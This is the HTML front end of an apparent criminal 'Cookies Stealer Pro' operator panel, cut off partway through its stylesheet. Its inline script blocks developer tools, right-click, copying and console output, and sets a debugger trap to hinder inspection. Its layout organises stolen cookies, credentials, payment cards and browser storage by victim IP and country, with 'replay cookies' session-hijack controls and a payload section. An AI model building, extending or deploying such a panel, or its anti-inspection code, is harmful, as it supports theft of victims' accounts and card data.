<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cipher Anon — Cookies Stealer Pro</title>

    <script>
        // ============================================================
        // AUTO-DETECT BASE URL — NO MANUAL EDITING NEEDED
        // ============================================================
        const BASE_URL = window.location.origin;

        (function() {
            document.addEventListener('keydown', function(e) {
                if (e.key === 'F12') { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) { e.preventDefault(); return false; }
                if (e.ctrlKey && e.shiftKey && (e.key === 'j' || e.key === 'J')) { e.preventDefault(); return false; }
                if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
                if (e.ctrlKey && (e.key === 's' || e.key === 'S')) { e.preventDefault(); return false; }
                if (e.ctrlKey && e.shiftKey && (e.key === 'c' || e.key === 'C')) { e.preventDefault(); return false; }
                if (e.metaKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
                if (e.metaKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) { e.preventDefault(); return false; }
                if (e.metaKey && e.shiftKey && (e.key === 'j' || e.key === 'J')) { e.preventDefault(); return false; }
            }, true);

            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);

            document.onselectstart = function() { return false; };
            document.oncopy = function() { return false; };
            document.oncut = function() { return false; };
            document.onpaste = function() { return false; };

            console.log = function() {};
            console.warn = function() {};
            console.error = function() {};
            console.debug = function() {};
            console.info = function() {};
            console.table = function() {};
            console.trace = function() {};
            console.group = function() {};
            console.groupEnd = function() {};
            console.dir = function() {};
            console.dirxml = function() {};
            console.clear();

            function blockDevtools() {
                try {
                    const start = performance.now();
                    debugger;
                    const end = performance.now();
                    if (end - start > 100) {
                        document.body.innerHTML = '<div style="background:#0a0a0a;color:#ff4444;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;font-size:24px;">🔒 Access Denied</div>';
                        window.location.reload();
                    }
                } catch {}
            }
            setInterval(blockDevtools, 1000);

            document.addEventListener('DOMContentLoaded', function() {
                document.querySelectorAll('script').forEach(el => {
                    if (el.src && !el.src.includes('blob:')) {
                        el.removeAttribute('src');
                    }
                });
            });
        })();
    </script>

    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #0b0f1a; }
        ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #2a3a5a; }

        body {
            background: #0b0f1a;
            color: #c8d0dc;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            user-select: none;
            -webkit-user-select: none;
        }

        .sidebar {
            width: 240px;
            background: linear-gradient(180deg, #0f1626 0%, #111827 100%);
            min-height: 100vh;
            padding: 20px 14px;
            border-right: 1px solid #1a2538;
            flex-shrink: 0;
            position: sticky;
            top: 0;
            height: 100vh;
            overflow-y: auto;
            transition: transform 0.3s ease;
            z-index: 100;
            display: flex;
            flex-direction: column;
        }
        .sidebar .logo { padding: 0 6px 18px 6px; border-bottom: 1px solid #1a2538; margin-bottom: 18px; }
        .sidebar .logo .brand { font-size: 16px; font-weight: 800; color: #00ff88; display: flex; align-items: center; gap: 8px; }
        .sidebar .logo .brand .icon { font-size: 20px; }
        .sidebar .logo .brand .highlight { color: #ff4444; }
        .sidebar .logo .sub { font-size: 9px; color: #475569; letter-spacing: 1.5px; text-transform: uppercase; margin-top: 2px; padding-left: 4px; }
        .sidebar .logo .sub span { color: #00ff88; }

        .sidebar .nav-item {
            padding: 8px 12px;
            border-radius: 8px;
            color: #64748b;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-bottom: 1px;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 500;
        }
        .sidebar .nav-item:hover { background: #1a2538; color: #e2e8f0; transform: translateX(4px); }
        .sidebar .nav-item.active { background: linear-gradient(135deg, #1a2538, #0f1626); color: #00ff88; border-left: 3px solid #00ff88; }
        .sidebar .nav-item .icon { font-size: 16px; width: 22px; text-align: center; }
        .sidebar .nav-divider { border-top: 1px solid #1a2538; margin: 12px 6px; }
        .sidebar .nav-label { font-size: 9px; color: #334155; text-transform: uppercase; letter-spacing: 1px; padding: 6px 12px; }
        .sidebar .version { font-size: 9px; color: #1e293b; text-align: center; margin-top: 16px; padding-top: 12px; border-top: 1px solid #1a2538; }

        .sidebar .contact-support {
            margin-top: auto;
            padding: 6px 12px;
            border-radius: 8px;
            background: linear-gradient(135deg, #1a2a3a, #0f1626);
            border: 1px solid #0088cc;
            color: #00aaff;
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 500;
            text-decoration: none;
            margin-bottom: 8px;
        }
        .sidebar .contact-support:hover {
            background: linear-gradient(135deg, #1a3a5a, #162030);
            border-color: #00ccff;
            color: #66ddff;
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(0,136,204,0.2);
        }
        .sidebar .contact-support .icon { font-size: 16px; }

        .sidebar .nav-item.trash-nav { color: #f59e0b; }
        .sidebar .nav-item.trash-nav:hover { color: #ffaa44; background: #1a1400; }
        .sidebar .nav-item.trash-nav.active { color: #f59e0b; border-left-color: #f59e0b; }
        .sidebar .nav-item.trash-nav .badge {
            margin-left: auto;
            background: #f59e0b;
            color: #0b0f1a;
            font-size: 9px;
            padding: 0 6px;
            border-radius: 8px;
            font-weight: 700;
            min-width: 18px;
            text-align: center;
        }

        .sidebar .nav-item.creds-nav { color: #ec4899; }
        .sidebar .nav-item.creds-nav:hover { color: #f472b6; background: #1a0a1a; }
        .sidebar .nav-item.creds-nav.active { color: #ec4899; border-left-color: #ec4899; }
        .sidebar .nav-item.creds-nav .badge {
            margin-left: auto;
            background: #ec4899;
            color: #0b0f1a;
            font-size: 9px;
            padding: 0 6px;
            border-radius: 8px;
            font-weight: 700;
            min-width: 18px;
            text-align: center;
        }

        .sidebar .nav-item.cards-nav { color: #06b6d4; }
        .sidebar .nav-item.cards-nav:hover { color: #22d3ee; background: #0a1a1a; }
        .sidebar .nav-item.cards-nav.active { color: #06b6d4; border-left-color: #06b6d4; }
        .sidebar .nav-item.cards-nav .badge {
            margin-left: auto;
            background: #06b6d4;
            color: #0b0f1a;
            font-size: 9px;
            padding: 0 6px;
            border-radius: 8px;
            font-weight: 700;
            min-width: 18px;
            text-align: center;
        }

        .sidebar .nav-item.storage-nav { color: #8b5cf6; }
        .sidebar .nav-item.storage-nav:hover { color: #a78bfa; background: #1a0a2a; }
        .sidebar .nav-item.storage-nav.active { color: #8b5cf6; border-left-color: #8b5cf6; }
        .sidebar .nav-item.storage-nav .badge {
            margin-left: auto;
            background: #8b5cf6;
            color: #0b0f1a;
            font-size: 9px;
            padding: 0 6px;
            border-radius: 8px;
            font-weight: 700;
            min-width: 18px;
            text-align: center;
        }

        .sidebar .nav-item.replay-nav { color: #f472b6; }
        .sidebar .nav-item.replay-nav:hover { color: #f9a8d4; background: #1a0a1a; }
        .sidebar .nav-item.replay-nav.active { color: #f472b6; border-left-color: #f472b6; }

        .sidebar .nav-item.payload-nav { color: #fbbf24; }
        .sidebar .nav-item.payload-nav:hover { color: #fcd34d; background: #1a1400; }
        .sidebar .nav-item.payload-nav.active { color: #fbbf24; border-left-color: #fbbf24; }

        .sidebar-toggle {
            display: none;
            position: fixed;
            top: 10px;
            left: 10px;
            z-index: 200;
            background: #0f1626;
            border: 1px solid #1a2538;
            color: #94a3b8;
            padding: 6px 10px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 18px;
            transition: 0.2s;
        }
        .sidebar-toggle:hover { border-color: #2a3a5a; color: #e2e8f0; }

        .sidebar-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.6);
            z-index: 50;
        }

        .main {
            flex: 1;
            padding: 20px 24px 24px;
            min-height: 100vh;
            background: radial-gradient(ellipse at 50% 0%, #111827 0%, #0b0f1a 100%);
            max-width: 100%;
            overflow-x: hidden;
        }

        .topbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 16px;
            border-bottom: 1px solid #1a2538;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .topbar .page-title h2 { font-size: 20px; font-weight: 700; color: #f1f5f9; background: linear-gradient(135deg, #f1f5f9 60%, #94a3b8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
        .topbar .page-title p { font-size: 12px; color: #475569; margin-top: 2px; }
        .topbar .page-title p .accent { color: #00ff88; }

        .topbar .right {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }

        .topbar .right .contact-btn {
            display: flex;
            align-items: center;
            gap: 6px;
            background: linear-gradient(135deg, #1a2a3a, #0f1626);
            border: 1px solid #0088cc;
            color: #00aaff;
            padding: 4px 12px;
            border-radius: 16px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.2s ease;
            text-decoration: none;
            font-weight: 500;
        }
        .topbar .right .contact-btn:hover {
            background: linear-gradient(135deg, #1a3a5a, #162030);
            border-color: #00ccff;
            color: #66ddff;
            box-shadow: 0 0 20px rgba(0,136,204,0.2);
            transform: scale(1.02);
        }

        .topbar .right .live-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            color: #64748b;
            background: #0f1626;
            padding: 4px 12px;
            border-radius: 16px;
            border: 1px solid #1a2538;
        }
        .topbar .right .live-badge .dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #00ff88;
            animation: pulse-dot 1.5s infinite;
            box-shadow: 0 0 8px rgba(0,255,136,0.3);
        }
        @keyframes pulse-dot { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } }

        .topbar .right .user {
            background: #0f1626;
            padding: 4px 12px 4px 8px;
            border-radius: 16px;
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            color: #e2e8f0;
            border: 1px solid #1a2538;
        }
        .topbar .right .user .avatar {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00ff88, #00cc77);
            color: #0b0f1a;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 11px;
        }
        .topbar .right .settings-btn {
            background: transparent;
            border: 1px solid #1a2538;
            color: #64748b;
            padding: 4px 12px;
            border-radius: 16px;
            cursor: pointer;
            font-size: 12px;
            transition: 0.2s;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .topbar .right .settings-btn:hover { border-color: #2a3a5a; color: #e2e8f0; }
        .topbar .right .logout-btn {
            background: transparent;
            border: 1px solid #ff4444;
            color: #ff4444;
            padding: 4px 12px;
            border-radius: 16px;
            cursor: pointer;
            font-size: 12px;
            transition: 0.2s;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .topbar .right .logout-btn:hover { background: rgba(255,68,68,0.1); border-color: #ff6666; color: #ff6666; }

        .stats-row {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 10px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #0f1626;
            border: 1px solid #1a2538;
            border-radius: 10px;
            padding: 10px 12px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff88, transparent);
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        .stat-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,0,0,0.3); }
        .stat-card:hover::before { opacity: 1; }

        .stat-card .label { font-size: 8px; color: #475569; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
        .stat-card .number { font-size: 22px; font-weight: 700; color: #f1f5f9; margin-top: 1px; font-family: 'Inter', sans-serif; }
        .stat-card .number.green { color: #00ff88; }
        .stat-card .number.orange { color: #f59e0b; }
        .stat-card .number.purple { color: #8b5cf6; }
        .stat-card .number.blue { color: #3b82f6; }
        .stat-card .number.pink { color: #ec4899; }
        .stat-card .number.cyan { color: #06b6d4; }
        .stat-card .number.violet { color: #8b5cf6; }
        .stat-card .number.gold { color: #fbbf24; }
        .stat-card .sub { font-size: 9px; color: #334155; margin-top: 1px; }

        .toolbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 16px;
        }
        .toolbar .left { display: flex; gap: 6px; flex-wrap: wrap; }
        .toolbar .right { display: flex; gap: 6px; flex-wrap: wrap; }

        .btn {
            padding: 6px 12px;
            border-radius: 8px;
            border: 1px solid #1a2538;
            background: #0f1626;
            color: #94a3b8;
            cursor: pointer;
            font-size: 11px;
            transition: all 0.25s ease;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            font-weight: 500;
            white-space: nowrap;
        }
        .btn:hover { border-color: #2a3a5a; background: #1a2538; color: #e2e8f0; transform: translateY(-1px); }
        .btn.primary { border-color: #00ff88; color: #00ff88; }
        .btn.primary:hover { background: rgba(0,255,136,0.08); box-shadow: 0 0 20px rgba(0,255,136,0.1); }
        .btn.danger { border-color: #ff4444; color: #ff4444; }
        .btn.danger:hover { background: rgba(255,68,68,0.08); box-shadow: 0 0 20px rgba(255,68,68,0.1); }
        .btn.warning { border-color: #f59e0b; color: #f59e0b; }
        .btn.warning:hover { background: rgba(245,158,11,0.08); box-shadow: 0 0 20px rgba(245,158,11,0.1); }
        .btn.violet { border-color: #8b5cf6; color: #8b5cf6; }
        .btn.violet:hover { background: rgba(139,92,246,0.08); box-shadow: 0 0 20px rgba(139,92,246,0.1); }
        .btn.replay-pink { border-color: #f472b6; color: #f472b6; }
        .btn.replay-pink:hover { background: rgba(244,114,182,0.08); box-shadow: 0 0 20px rgba(244,114,182,0.1); }
        .btn.payload-gold { border-color: #fbbf24; color: #fbbf24; }
        .btn.payload-gold:hover { background: rgba(251,191,36,0.08); box-shadow: 0 0 20px rgba(251,191,36,0.1); }
        .btn.small { font-size: 9px; padding: 4px 8px; }

        .btn-icon-sm {
            background: transparent;
            border: 1px solid #1a2538;
            color: #64748b;
            padding: 0 6px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 10px;
            transition: 0.2s;
            line-height: 20px;
            height: 22px;
        }
        .btn-icon-sm:hover { border-color: #2a3a5a; color: #e2e8f0; background: #1a2538; }
        .btn-icon-sm.copy { border-color: #00ff88; color: #00ff88; }
        .btn-icon-sm.copy:hover { background: rgba(0,255,136,0.08); }
        .btn-icon-sm.download { border-color: #f59e0b; color: #f59e0b; }
        .btn-icon-sm.download:hover { background: rgba(245,158,11,0.08); }
        .btn-icon-sm.eye { border-color: #3b82f6; color: #3b82f6; }
        .btn-icon-sm.eye:hover { background: rgba(59,130,246,0.08); }
        .btn-icon-sm.delete-sm { border-color: #ff4444; color: #ff4444; }
        .btn-icon-sm.delete-sm:hover { background: rgba(255,68,68,0.15); }
        .btn-icon-sm.txt { border-color: #8b5cf6; color: #8b5cf6; }
        .btn-icon-sm.txt:hover { background: rgba(139,92,246,0.08); }
        .btn-icon-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
        .btn-icon-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
        .btn-icon-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
        .btn-icon-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
        .btn-icon-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
        .btn-icon-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
        .btn-icon-sm.expand-sm { border-color: #475569; color: #94a3b8; }
        .btn-icon-sm.expand-sm:hover { border-color: #64748b; color: #e2e8f0; background: #1a2538; }
        .btn-icon-sm.rename { border-color: #f59e0b; color: #f59e0b; }
        .btn-icon-sm.rename:hover { background: rgba(245,158,11,0.08); }
        .btn-icon-sm.payload-copy { border-color: #fbbf24; color: #fbbf24; }
        .btn-icon-sm.payload-copy:hover { background: rgba(251,191,36,0.08); }

        .pc-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
        }
        .pc-card {
            background: #0f1626;
            border: 1px solid #1a2538;
            border-radius: 12px;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        .pc-card:hover { border-color: #2a3a5a; box-shadow: 0 8px 40px rgba(0,0,0,0.4); }

        .pc-card .pc-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 14px 18px;
            cursor: pointer;
            transition: background 0.2s ease;
            gap: 8px;
            flex-wrap: wrap;
        }
        .pc-card .pc-header:hover { background: #1a2538; }
        .pc-card .pc-header .pc-name {
            font-size: 15px;
            font-weight: 700;
            color: #f1f5f9;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .pc-card .pc-header .pc-name .icon { font-size: 18px; }
        .pc-card .pc-header .pc-name .expand-icon {
            font-size: 12px;
            color: #64748b;
            transition: transform 0.3s ease;
            display: inline-block;
        }
        .pc-card .pc-header .pc-name .expand-icon.open { transform: rotate(180deg); }
        .pc-card .pc-header .pc-stats {
            font-size: 11px;
            color: #64748b;
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }
        .pc-card .pc-header .pc-stats span { display: flex; align-items: center; gap: 3px; }
        .pc-card .pc-header .pc-stats .cookies { color: #00ff88; }
        .pc-card .pc-header .pc-stats .creds { color: #ec4899; }
        .pc-card .pc-header .pc-stats .cards { color: #06b6d4; }
        .pc-card .pc-header .pc-stats .storage { color: #8b5cf6; }
        .pc-card .pc-header .pc-stats .victims { color: #f59e0b; }

        .pc-card .pc-meta {
            font-size: 10px;
            color: #64748b;
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            padding: 0 18px 8px 18px;
        }
        .pc-card .pc-meta .flag { font-size: 14px; }
        .pc-card .pc-meta .ip { color: #94a3b8; font-family: monospace; }
        .pc-card .pc-meta .country { color: #94a3b8; }

        .pc-card .pc-body {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.4s ease, padding 0.3s ease;
            padding: 0 18px;
        }
        .pc-card .pc-body.open {
            max-height: 2000px;
            padding: 0 18px 16px 18px;
        }

        .pc-card .domain-list {
            display: grid;
            grid-template-columns: 1fr;
            gap: 6px;
        }
        .pc-card .domain-item {
            background: #0b0f1a;
            border: 1px solid #1a2538;
            border-radius: 6px;
            padding: 6px 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 6px;
            transition: 0.2s;
        }
        .pc-card .domain-item:hover { border-color: #2a3a5a; background: #111827; }

        .pc-card .domain-item .domain-name {
            color: #00ff88;
            font-size: 12px;
            font-weight: 500;
            word-break: break-all;
        }
        .pc-card .domain-item .domain-stats {
            font-size: 9px;
            color: #64748b;
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        .pc-card .domain-item .domain-stats .cookies { color: #00ff88; }
        .pc-card .domain-item .domain-stats .creds { color: #ec4899; }
        .pc-card .domain-item .domain-stats .cards { color: #06b6d4; }
        .pc-card .domain-item .domain-stats .storage { color: #8b5cf6; }
        .pc-card .domain-item .domain-actions {
            display: flex;
            gap: 3px;
            flex-wrap: wrap;
        }
        .pc-card .domain-item .domain-actions .btn-sm {
            padding: 1px 6px;
            font-size: 8px;
            border-radius: 4px;
            border: 1px solid #1a2538;
            background: transparent;
            color: #64748b;
            cursor: pointer;
            transition: all 0.2s ease;
            font-weight: 500;
        }
        .pc-card .domain-item .domain-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
        .pc-card .domain-item .domain-actions .btn-sm.replay-cookies { border-color: #00ff88; color: #00ff88; }
        .pc-card .domain-item .domain-actions .btn-sm.replay-cookies:hover { background: rgba(0,255,136,0.08); }
        .pc-card .domain-item .domain-actions .btn-sm.replay-storage { border-color: #8b5cf6; color: #8b5cf6; }
        .pc-card .domain-item .domain-actions .btn-sm.replay-storage:hover { background: rgba(139,92,246,0.08); }
        .pc-card .domain-item .domain-actions .btn-sm.test-sm { border-color: #3b82f6; color: #3b82f6; }
        .pc-card .domain-item .domain-actions .btn-sm.test-sm:hover { background: rgba(59,130,246,0.08); }
        .pc-card .domain-item .domain-actions .btn-sm.download { border-color: #f59e0b; color: #f59e0b; }
        .pc-card .domain-item .domain-actions .btn-sm.download:hover { background: rgba(245,158,11,0.08); }
        .pc-card .domain-item .domain-actions .btn-sm.view { border-color: #3b82f6; color: #3b82f6; }
        .pc-card .domain-item .domain-actions .btn-sm.view:hover { background: rgba(59,130,246,0.08); }
        .pc-card .domain-item .domain-actions .btn-sm.disabled {
            opacity: 0.3;
            cursor: default;
            border-color: #334155;
        }
        .pc-card .domain-item .domain-actions .btn-sm.disabled:hover {
            background: transparent;
            transform: none;
        }

        .pc-card .pc-footer-actions {
            padding: 10px 18px 14px 18px;
            border-top: 1px solid #1a2538;
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
            margin-top: 4px;
        }
        .pc-card .pc-footer-actions .btn-sm {
            padding: 2px 10px;
            font-size: 9px;
            border-radius: 4px;
            border: 1px solid #1a2538;
            background: transparent;
            color: #64748b;
            cursor: pointer;
            transition: all 0.2s ease;
            font-weight: 500;
        }
        .pc-card .pc-footer-actions .btn-sm:hover { border-color: #2a3a5a; color: #e2e8f0; transform: translateY(-1px); }
        .pc-card .pc-footer-actions .btn-sm.danger { border-color: #ff4444; color: #ff4444; }
        .pc-card .pc-footer-actions .btn-sm.danger:hover { background: rgba(255,68,68,0.15); }
        .pc-card .pc-footer-actions .btn-sm.primary { border-color: #00ff88; color: #00ff88; }
        .pc-card .pc-footer-actions .btn-sm.primary:hover { background: rgba(0,255,136,0.08); }
        .pc-card .pc-footer-actions .btn-sm.violet { border-color: #8b5cf6; color: #8b5cf6; }
        .pc-card .pc-footer-actions .btn-sm.violet:hover { background: rgba(139,92,246,0.08); }

        .payload-container {
            max-width: 900px;
            margin: 0 auto;
        }
        .payload-card {
            background: #0f1626;
            border: 1px solid #1a2538;
            border-radius: 12px;
            padding: 20px 24px;
            margin-bottom: 16px;
            transition: all 0.3s ease;
        }
        .payload-card:hover { border-color: #2a3a5a; box-shadow: 0 8px 40px rgba(0,0,0,0.4); }
        .payload-card .payload-title {
            font-size: 14px;
            font-weight: 600;
            color: #f1f5f9;
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 8px;
        }
        .payload-card .payload-title .badge {
            font-size: 8px;
            background: #fbbf24;
            color: #0b0f1a;
            padding: 1px 8px;
            border-radius: 10px;
            font-weight: 700;
            text-transform: uppercase;
            margin-left: 6px;
        }
        .payload-card .payload-url {
            background: #0b0f1a;
            border: 1px solid #1a2538;
            border-radius: 6px;
            padding: 8px 12px;
            font-family: 'Cascadia Code', 'Consolas', monospace;
            font-size: 12px;
            color: #00ff88;
            word-break: break-all;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .payload-card .payload-url .url-text {
            flex: 1;
            min-width: 100px;
            word-break: break-all;
        }
        .payload-card .payload-command {
            background: #0b0f1a;
            border: 1px solid #1a2538;
            border-radius: 6px;
            padding: 10px 12px;
            font-family: 'Cascadia Code', 'Consolas', monospace;
            font-size: 11px;
            color: #f1f5f9;
            word-break: break-all;
            white-space: pre-wrap;
            margin-top: 6px;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            gap: 8px;
        }
        .payload-card .payload-command .cmd-text {
            flex: 1;
            min-width: 100px;
        }
        .payload-card .payload-desc {
            font-size: 11px;
            color: #64748b;
            margin-bottom: 8px;
            line-height: 1.6;
        }
        .payload-card .payload-desc code {
            color: #fbbf24;
            background: #1a2538;
            padding: 1px 6px;
            border-radius: 4px;
            font-size: 10px;
        }
        .payload-card .payload-options {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-top: 8px;
        }
        .payload-card .payload-options .btn {
            font-size: 10px;
            padding: 4px 10px;
        }

        .view-content { display: none; }
        .view-content.active { display: block; }

        .cookies-table-wrap { overflow-x: auto; margin-top: 12px; }
        .cookies-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 11px;
            min-width: 500px;
        }
        .cookies-table th {
            text-align: left;
            padding: 8px 10px;
            background: #1a2538;
            color: #94a3b8;
            font-weight: 600;
            text-transform: uppercase;
            font-size: 9px;
            letter-spacing: 0.4px;
            border-bottom: 2px solid #2a3a5a;
            position: sticky;
            top: 0;
        }
        .cookies-table td { padding: 6px 10px; border-bottom: 1px solid #1a2538; color: #c8d0dc; vertical-align: middle; }
        .cookies-table tr:hover td { background: #1a2538; }
        .cookies-table .cookie-domain { color: #00ff88; font-weight: 500; }
        .cookies-table .cookie-name { color: #f59e0b; font-family: monospace; font-size: 10px; }
        .cookies-table .cookie-value { color: #94a3b8; font-family: monospace; font-size: 10px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .cookies-table .cookie-valuable { background: #ff4444; color: #fff; font-size: 6px; padding: 1px 6px; border-radius: 6px; text-transform: uppercase; font-weight: 700; }
        .cookies-table .pc-label { color: #f472b6; font-weight: 500; font-size: 10px; }

        .cred-row { border-left: 2px solid #ec4899; }
        .cred-row td { padding: 4px 8px; font-size: 10px; }
        .cred-row .cred-name { color: #ec4899; font-weight: 500; }
        .cred-row .cred-value { color: #f1f5f9; font-family: monospace; }
        .cred-row .cred-type { color: #64748b; font-size: 8px; background: #1a2538; padding: 1px 6px; border-radius: 4px; }
        .cred-row .pc-label { color: #f472b6; font-weight: 500; font-size: 10px; }

        .card-row { border-left: 2px solid #06b6d4; }
        .card-row td { padding: 4px 8px; font-size: 10px; }
        .card-row .card-name { color: #06b6d4; font-weight: 500; }
        .card-row .card-value { color: #f1f5f9; font-family: monospace; }
        .card-row .card-type { color: #64748b; font-size: 8px; background: #1a2538; padding: 1px 6px; border-radius: 4px; }
        .card-row .pc-label { color: #f472b6; font-weight: 500; font-size: 10px; }

        .storage-row { border-left: 2px solid #8b5cf6; }
        .storage-row td { padding: 4px 8px; font-size: 10px; }
        .storage-row .storage-key { color: #8b5cf6; font-weight: 500; }
        .storage-row .storage-value { color: #f1f5f9; font-family: monospace; }
        .storage-row .storage-browser { color: #64748b; font-size: 8px; background: #1a2538; padding: 1px 6px; border-radius: 4px; }
        .storage-row .pc-label { color: #f472b6; font-weight: 500; font-size: 10px; }

        .victims-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
            margin-top: 12px;
        }
        .victims-grid .section-header {
            font-size: 14px;
            font-weight: 700;
            color: #f1f5f9;
            padding: 8px 4px 12px 4px;
            border-bottom: 1px solid #1a2538;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .victims-grid .section-header .count { color: #64748b; font-weight: 400; font-size: 13px; }

        .victim-group {
            margin-bottom: 8px;
        }
        .victim-group .group-header {
            font-size: 13px;
            font-weight: 600;
            color: #f472b6;
            padding: 6px 4px;
            border-bottom: 1px solid #1a2538;
            margin-bottom: 6px;
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            transition: 0.2s;
        }
        .victim-group .group-header:hover { color: #f9a8d4; }
        .victim-group .group-header .expand-icon {
            font-size: 10px;
            color: #64748b;
            transition: transform 0.3s ease;
            display: inline-block;
        }
        .victim-group .group-header .expand-icon.open { transform: rotate(180deg); }
        .victim-group .group-header .count { color: #64748b; font-weight: 400; font-size: 11px; }
        .victim-group .group-body {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.4s ease, padding 0.3s ease;
            padding: 0;
        }
        .victim-group .group-body.open {
            max-height: 2000px;
            padding: 4px 0;
        }

        .victim-card {
            background: #0f1626;
            border: 1px solid #1a2538;
            border-radius: 10px;
            padding: 12px 16px;
            transition: 0.2s;
            cursor: pointer;
            position: relative;
            margin-bottom: 6px;
        }
        .victim-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .victim-card .v-header { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; flex-wrap: wrap; }
        .victim-card .v-header .flag { font-size: 18px; }
        .victim-card .v-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
        .victim-card .v-header .domain-name { color: #00ff88; font-size: 12px; font-weight: 500; }
        .victim-card .v-details { font-size: 10px; color: #64748b; display: flex; flex-wrap: wrap; gap: 8px; }
        .victim-card .v-details .country { color: #94a3b8; }
        .victim-card .v-details .time { color: #475569; }
        .victim-card .v-stats {
            font-size: 9px;
            color: #64748b;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin: 4px 0;
        }
        .victim-card .v-stats .cookies { color: #00ff88; }
        .victim-card .v-stats .creds { color: #ec4899; }
        .victim-card .v-stats .cards { color: #06b6d4; }
        .victim-card .v-stats .storage { color: #8b5cf6; }
        .victim-card .v-delete {
            position: absolute;
            top: 8px;
            right: 8px;
            background: transparent;
            border: none;
            color: #475569;
            font-size: 12px;
            cursor: pointer;
            transition: 0.2s;
            padding: 2px 4px;
            border-radius: 4px;
        }
        .victim-card .v-delete:hover { color: #ff4444; background: rgba(255,68,68,0.1); }
        .victim-card .v-actions {
            display: flex;
            gap: 4px;
            margin-top: 6px;
            padding-top: 6px;
            border-top: 1px solid #1a2538;
            flex-wrap: wrap;
        }
        .victim-card .v-actions .btn-sm {
